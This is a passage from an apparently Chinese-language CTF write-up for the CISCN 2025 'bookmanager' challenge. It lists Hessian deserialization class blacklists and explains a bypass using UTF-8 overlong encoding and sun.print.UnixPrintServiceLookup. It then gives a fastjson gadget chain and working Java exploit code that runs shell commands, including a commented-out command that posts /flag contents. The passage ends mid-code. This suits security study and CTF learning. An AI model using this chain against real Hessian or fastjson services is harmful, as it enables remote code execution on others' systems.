class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs java">bsh.<br>ch.qos.logback.core.db.<br>clojure.<br>com.alibaba.citrus.springext.support.parser.<br>com.alibaba.citrus.springext.util.SpringExtUtil.<br>com.alibaba.druid.pool.<br>com.alibaba.hotcode.internal.org.apache.commons.collections.functors.<br>com.alipay.custrelation.service.model.redress.<br>com.alipay.oceanbase.obproxy.druid.pool.<br>com.caucho.config.types.<br>com.caucho.hessian.test.<br>com.caucho.naming.<br>com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller.<br>com.ibm.xltxe.rnm1.xtq.bcel.util.<br>com.mchange.v2.c3p0.<br>com.mysql.jdbc.util.<br>com.rometools.rome.feed.<br>com.sun.corba.se.impl.<br>com.sun.corba.se.spi.orbutil.<br>com.sun.jndi.ldap<br>com.sun.jndi.rmi.<br>com.sun.jndi.toolkit.<br>com.sun.org.apache.bcel.internal.<br>com.sun.org.apache.xalan.internal.<br>com.sun.rowset.<br>com.sun.xml.internal.bind.v2.<br>com.taobao.vipserver.commons.collections.functors.<br>groovy.lang.<br>java.awt.<br>java.beans.<br>java.lang.ProcessBuilder<br>java.lang.Runtime<br>java.rmi.server.<br>java.security.<br>java.util.ServiceLoader<br>java.util.StringTokenizer<br>javassist.bytecode.annotation.<br>javassist.tools.web.Viewer<br>javassist.util.proxy.<br>javax.imageio.<br>javax.imageio.spi.<br>javax.management.<br>javax.media.jai.remote.<br>javax.naming.<br>javax.script.<br>javax.sound.sampled.<br>javax.swing.<br>javax.xml.transform.<br>net.bytebuddy.dynamic.loading.<br>oracle.jdbc.connector.<br>oracle.jdbc.pool.<br>org.apache.aries.transaction.jms.<br>org.apache.bcel.util.<br>org.apache.carbondata.core.scan.expression.<br>org.apache.commons.beanutils.<br>org.apache.commons.codec.binary.<br>org.apache.commons.collections.functors.<br>org.apache.commons.collections4.functors.<br>org.apache.commons.codec.<br>org.apache.commons.configuration.<br>org.apache.commons.configuration2.<br>org.apache.commons.dbcp.datasources.<br>org.apache.commons.dbcp2.datasources.<br>org.apache.commons.fileupload.disk.<br>org.apache.ibatis.executor.loader.<br>org.apache.ibatis.javassist.bytecode.<br>org.apache.ibatis.javassist.tools.<br>org.apache.ibatis.javassist.util.<br>org.apache.ignite.cache.<br>org.apache.log.output.db.<br>org.apache.log4j.receivers.db.<br>org.apache.myfaces.view.facelets.el.<br>org.apache.openjpa.ee.<br>org.apache.shiro.<br>org.apache.tomcat.dbcp.<br>org.apache.velocity.runtime.<br>org.apache.velocity.<br>org.apache.wicket.util.<br>org.apache.xalan.xsltc.trax.<br>org.apache.xbean.naming.context.<br>org.apache.xpath.<br>org.apache.zookeeper.<br>org.aspectj.<br>org.codehaus.groovy.runtime.<br>org.datanucleus.store.rdbms.datasource.dbcp.datasources.<br>org.dom4j.<br>org.eclipse.jetty.util.log.<br>org.geotools.filter.<br>org.h2.value.<br>org.hibernate.tuple.component.<br>org.hibernate.type.<br>org.jboss.ejb3.<br>org.jboss.proxy.ejb.<br>org.jboss.resteasy.plugins.server.resourcefactory.<br>org.jboss.weld.interceptor.builder.<br>org.junit.<br>org.mockito.internal.creation.cglib.<br>org.mortbay.log.<br>org.mockito.<br>org.thymeleaf.<br>org.quartz.<br>org.springframework.aop.aspectj.<br>org.springframework.beans.BeanWrapperImpl$BeanPropertyHandler<br>org.springframework.beans.factory.<br>org.springframework.expression.spel.<br>org.springframework.jndi.<br>org.springframework.orm.<br>org.springframework.transaction.<br>org.yaml.snakeyaml.tokens.<br>ognl.<br>pstore.shaded.org.apache.commons.collections.<br>sun.print.<br>sun.rmi.server.<br>sun.rmi.transport.<br>weblogic.ejb20.internal.<br>weblogic.jms.common.<br></code></pre></td></tr></table></figure><p>çœ‹èµ·æ¥å”¬äººï¼Œç»™ä½ banå¾—å·®ä¸å¤šäº†ï¼Œä½†æ˜¯å°±æ˜¯å› ä¸ºä»–ä½¿ç”¨çš„KMPç®—æ³•åŒ¹é…ï¼Œå¯ä»¥ä½¿ç”¨<a href="https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/#/hessian">UTF-8-Overlong-Encoding</a>ç»•è¿‡ã€‚ï¼ˆX1å“¥è¿˜æ˜¯å¤ªå¼ºäº†ï¼‰</p><p>ä½†æ˜¯ç›´æ¥åˆ©ç”¨è¿˜æ˜¯å¤±è´¥äº†ï¼Œè°ƒè¯•ä¸€ä¸‹ä¼šå‘ç°è¿˜æœ‰ä¸ªé»‘åå•çš„é™åˆ¶ï¼š</p><p><img src="/2025/02/05/CISCN2025-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF0%E8%A7%A3%E9%A2%98-bookmanager%E6%B5%85%E6%9E%90/image-20250205164247175.png" alt="image-20250205164247175"></p><p>è¿™ä¸ªå­˜åœ¨äºhessian-liteä¸­çš„<code>ClassFactory</code>é‡Œï¼š</p><p><img src="/2025/02/05/CISCN2025-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF0%E8%A7%A3%E9%A2%98-bookmanager%E6%B5%85%E6%9E%90/image-20250205164350440.png" alt="image-20250205164350440"></p><p>è½¬æ¢ä¸€ä¸‹ï¼Œæˆ‘ä»¬èƒ½å¾—åˆ°é»‘åå•2ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs java">bsh.<br>ch.qos.logback.core.db.<br>clojure.<br>com.alibaba.citrus.springext.support.parser.<br>com.alibaba.citrus.springext.util.SpringExtUtil.<br>com.alibaba.druid.pool.<br>com.alibaba.hotcode.internal.org.apache.commons.collections.functors.<br>com.alipay.custrelation.service.model.redress.<br>com.alipay.oceanbase.obproxy.druid.pool.<br>com.caucho.config.types.<br>com.caucho.hessian.test.<br>com.caucho.naming.<br>com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller.<br>com.ibm.xltxe.rnm1.xtq.bcel.util.<br>com.mchange.v2.c3p0.<br>com.mysql.jdbc.util.<br>com.rometools.rome.feed.<br>com.sun.corba.se.impl.<br>com.sun.corba.se.spi.orbutil.<br>com.sun.jndi.rmi.<br>com.sun.jndi.toolkit.<br>com.sun.org.apache.bcel.internal.<br>com.sun.org.apache.xalan.internal.<br>com.sun.rowset.<br>com.sun.xml.internal.bind.v2.<br>com.taobao.vipserver.commons.collections.functors.<br>groovy.lang.<br>java.awt.<br>java.beans.<br>java.lang.ProcessBuilder<br>java.lang.Runtime<br>java.rmi.server.<br>java.security.<br>java.util.ServiceLoader<br>java.util.StringTokenizer<br>javassist.bytecode.annotation.<br>javassist.tools.web.Viewer<br>javassist.util.proxy.<br>javax.imageio.<br>javax.imageio.spi.<br>javax.management.<br>javax.media.jai.remote.<br>javax.naming.<br>javax.script.<br>javax.sound.sampled.<br>javax.swing.<br>javax.xml.transform.<br>net.bytebuddy.dynamic.loading.<br>oracle.jdbc.connector.<br>oracle.jdbc.pool.<br>org.apache.aries.transaction.jms.<br>org.apache.bcel.util.<br>org.apache.carbondata.core.scan.expression.<br>org.apache.commons.beanutils.<br>org.apache.commons.codec.binary.<br>org.apache.commons.collections.functors.<br>org.apache.commons.collections4.functors.<br>org.apache.commons.configuration.<br>org.apache.commons.configuration2.<br>org.apache.commons.dbcp.datasources.<br>org.apache.commons.dbcp2.datasources.<br>org.apache.commons.fileupload.disk.<br>org.apache.ibatis.executor.loader.<br>org.apache.ibatis.javassist.bytecode.<br>org.apache.ibatis.javassist.tools.<br>org.apache.ibatis.javassist.util.<br>org.apache.ignite.cache.<br>org.apache.log.output.db.<br>org.apache.log4j.receivers.db.<br>org.apache.myfaces.view.facelets.el.<br>org.apache.openjpa.ee.<br>org.apache.openjpa.ee.<br>org.apache.shiro.<br>org.apache.tomcat.dbcp.<br>org.apache.velocity.runtime.<br>org.apache.velocity.<br>org.apache.wicket.util.<br>org.apache.xalan.xsltc.trax.<br>org.apache.xbean.naming.context.<br>org.apache.xpath.<br>org.apache.zookeeper.<br>org.aspectj.apache.bcel.util.<br>org.codehaus.groovy.runtime.<br>org.datanucleus.store.rdbms.datasource.dbcp.datasources.<br>org.eclipse.jetty.util.log.<br>org.geotools.filter.<br>org.h2.value.<br>org.hibernate.tuple.component.<br>org.hibernate.type.<br>org.jboss.ejb3.<br>org.jboss.proxy.ejb.<br>org.jboss.resteasy.plugins.server.resourcefactory.<br>org.jboss.weld.interceptor.builder.<br>org.mockito.internal.creation.cglib.<br>org.mortbay.log.<br>org.quartz.<br>org.springframework.aop.aspectj.<br>org.springframework.beans.BeanWrapperImpl$BeanPropertyHandler<br>org.springframework.beans.factory.<br>org.springframework.expression.spel.<br>org.springframework.jndi.<br>org.springframework.orm.<br>org.springframework.transaction.<br>org.yaml.snakeyaml.tokens.<br>pstore.shaded.org.apache.commons.collections.<br>sun.rmi.server.<br>sun.rmi.transport.<br>weblogic.ejb20.internal.<br>weblogic.jms.common.<br></code></pre></td></tr></table></figure><p>å¯¹æ¯”ä¸€ä¸‹ï¼Œä¼šå‘ç°æœ‰ä¸ªä¸åŒçš„ä¸œè¥¿ï¼Œé»‘åå•1æœ‰ï¼Œé»‘åå•2å´æ²¡æœ‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">sun.print.<br></code></pre></td></tr></table></figure><p>è¿™å°±æ˜¯æœ¬é¢˜çš„æ ¸å¿ƒç»•è¿‡ç‚¹ã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>jaråŒ…ç»™äº†fjä¾èµ–ï¼Œä¸‹é¢æˆ‘è´´å‡ºçš„åšå®¢ä¸­å¤§ä½¬æŒ–å‡ºäº†ä¸ªsolonçš„é“¾å­ï¼Œä¸­é—´æœ‰ä¸ªå°±æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">sun.print.UnixPrintServiceLookup<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ç¾ä¸­ä¸è¶³çš„æ˜¯è¿™ä¸ªå¿…é¡»Unixç±»æ“ä½œç³»ç»Ÿæ‰æœ‰ï¼Œä¹Ÿå°±æ˜¯æˆ‘Windowsæ²¡æ³•ç›´æ¥è°ƒï¼Œä¼šæ˜¾ç¤ºæ²¡è¿™ä¸ªåŒ…ã€‚</p><p>Linuxå’ŒMacçš„javaç¯å¢ƒåº”è¯¥èƒ½ç›´æ¥è°ƒå‡ºæ¥ã€‚</p><p>ä¼—æ‰€å‘¨çŸ¥fjçš„<code>JSONObject#toString</code>èƒ½è§¦å‘ä»»æ„getterï¼Œæˆ‘ä»¬ä½¿ç”¨å®ƒå»è°ƒç”¨<code>UnixPrintServiceLookup#getDefaultPrintService</code>ï¼Œå¦‚æ­¤é“¾å­ä¾¿æ‹‰é€šäº†ã€‚</p><p>æˆ‘ä»¬ä»æœ€åŸå§‹å’Œç»å…¸çš„fjé“¾å…¥æ‰‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream.readObject -&gt; <br>HashMap.readObject -&gt; <br>BadAttributeValueExpException.readObject -&gt; <br>JSONArray.toString -&gt; <br>JSON.toString ï¼ˆJSONArray <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JSON</span>ï¼‰-&gt; <br>JSON.toJSONString -&gt; <br>TemplatesImpl.getOutputProperties -&gt; <br>TemplatesImpl.newTransformer<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ç”±äºå­˜åœ¨é»‘åå•ï¼Œå› æ­¤éœ€è¦è¿›è¡Œç»•è¿‡ä»¥ä¸‹ä¸¤ä¸ªç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.management.BadAttributeValueExpException<br>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<br></code></pre></td></tr></table></figure><p>å¯¹äº <code>BadAttributeValueExpException</code>ï¼Œå…¶ä½œç”¨ä¸º <code>from readObject to toStringBean.toString</code>ï¼Œå¯ä»¥æ‰¾åˆ°æœªè¢« blacklist çš„ <code>XString.equals</code> æ¥æ›¿æ¢ï¼Œè€Œæœ€åçš„ sink å¯ä»¥ä½¿ç”¨ <code>UnixPrintServiceLookup</code> æ›¿æ¢ï¼Œæœ€ç»ˆçš„è°ƒç”¨é“¾ä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">getDefaultPrintService:<span class="hljs-number">640</span>, UnixPrintServiceLookup (sun.print)<br>write:-<span class="hljs-number">1</span>, ASMSerializer_1_UnixPrintServiceLookup (com.alibaba.fastjson.serializer)<br>write:<span class="hljs-number">271</span>, MapSerializer (com.alibaba.fastjson.serializer)<br>write:<span class="hljs-number">44</span>, MapSerializer (com.alibaba.fastjson.serializer)<br>write:<span class="hljs-number">312</span>, JSONSerializer (com.alibaba.fastjson.serializer)<br>toJSONString:<span class="hljs-number">1077</span>, JSON (com.alibaba.fastjson)<br>toString:<span class="hljs-number">1071</span>, JSON (com.alibaba.fastjson)<br>equals:<span class="hljs-number">391</span>, XString (com.sun.org.apache.xpath.internal.objects)<br>equals:<span class="hljs-number">495</span>, AbstractMap (java.util)<br>putVal:<span class="hljs-number">636</span>, HashMap (java.util)<br>put:<span class="hljs-number">613</span>, HashMap (java.util)<br>doReadMap:<span class="hljs-number">145</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readMap:<span class="hljs-number">126</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2733</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2308</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>main:<span class="hljs-number">166</span>, Main (org.example)<br></code></pre></td></tr></table></figure><p>Linuxä¸‹è°ƒï¼Œç¡®å®èƒ½é€š:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><span class="hljs-keyword">import</span> sun.print.UnixPrintServiceLookup;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XStringtoGetterExp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(filedName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//éœ€è¦æ‰§è¡Œçš„å‘½ä»¤</span><br>            <span class="hljs-comment">//String cmd = &quot;curl -X POST http://127.0.0.1:8080/api/rest/book/addBook -H \&quot;Content-Type: application/json\&quot; -d &#x27;&#123;\&quot;bookId\&quot;: 1, \&quot;title\&quot;: \&quot;&#x27;$(cat /flag)&#x27;\&quot;, \&quot;author\&quot;: \&quot;&#x27;EddieMurphy&#x27;\&quot;, \&quot;publishDate\&quot;: \&quot;2025-01-01\&quot;, \&quot;price\&quot;: 13.14&#125;&#x27;&quot;;</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;touch /tmp/success_eddie&quot;</span>;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafe</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>            theUnsafe.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafe.get(<span class="hljs-literal">null</span>);<br>            <span class="hljs-comment">//Class&lt;?&gt; cls = Class.forName(&quot;sun.print.UnixPrintServiceLookup&quot;);</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">unixPrintServiceLookup</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(UnixPrintServiceLookup.class);<br>            <span class="hljs-comment">//Object unixPrintServiceLookup = unsafe.allocateInstance(cls);</span><br>            <span class="hljs-comment">//è®¾ç½®å±æ€§</span><br>            setFieldValue(unixPrintServiceLookup, <span class="hljs-string">&quot;cmdIndex&quot;</span>, <span class="hljs-number">0</span>);<br>            setFieldValue(unixPrintServiceLookup, <span class="hljs-string">&quot;osname&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br>            setFieldValue(unixPrintServiceLookup, <span class="hljs-string">&quot;lpcFirstCom&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;cmd, cmd, cmd&#125;);<br>            <span class="hljs-comment">//å°è£…ä¸€ä¸ªJSONObjectå¯¹è±¡è°ƒç”¨getteræ–¹æ³•</span><br>            <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>            jsonObject.put(<span class="hljs-string">&quot;xx&quot;</span>, unixPrintServiceLookup);<br><br>            <span class="hljs-comment">//ä½¿ç”¨XStringç±»è°ƒç”¨toStringæ–¹æ³•</span><br>            <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;xx&quot;</span>);<br>            <span class="hljs-type">HashMap</span> <span class="hljs-variable">map1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            <span class="hljs-type">HashMap</span> <span class="hljs-variable">map2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            map1.put(<span class="hljs-string">&quot;yy&quot;</span>, jsonObject);<br>            map1.put(<span class="hljs-string">&quot;zZ&quot;</span>, xString);<br>            map2.put(<span class="hljs-string">&quot;yy&quot;</span>, xString);<br>            map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, jsonObject);<br><br>            <span class="hljs-type">HashMap</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>            Class nodeC;<br>            <span class="hljs-keyword">try</span> &#123;<br>                nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>                nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>            &#125;<br>            <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>            nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>            Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, map1, map1, <span class="hljs-literal">null</span>));<br>            Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, map2, map2, <span class="hljs-literal">null</span>));<br>            setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br><br>            <span class="hljs-comment">//FileOutputStream fileOutputStream=new FileOutputStream(&quot;ser.bin&quot;);</span><br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">Hessian2OutputWithOverlongEncoding</span> <span class="hljs-variable">hessianOutput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2OutputWithOverlongEncoding</span>(byteArrayOutputStream);<br>            <span class="hljs-comment">//Hessian2OutputWithOverlongEncoding hessianOutput = new Hessian2OutputWithOverlongEncoding(fileOutputStream);</span><br>            hessianOutput.setSerializerFactory(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>());<br>            hessianOutput.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>            hessianOutput.writeObject(s);<br>            hessianOutput.flushBuffer();<br>            System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));<br>            des(byteArrayOutputStream.toByteArray());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span 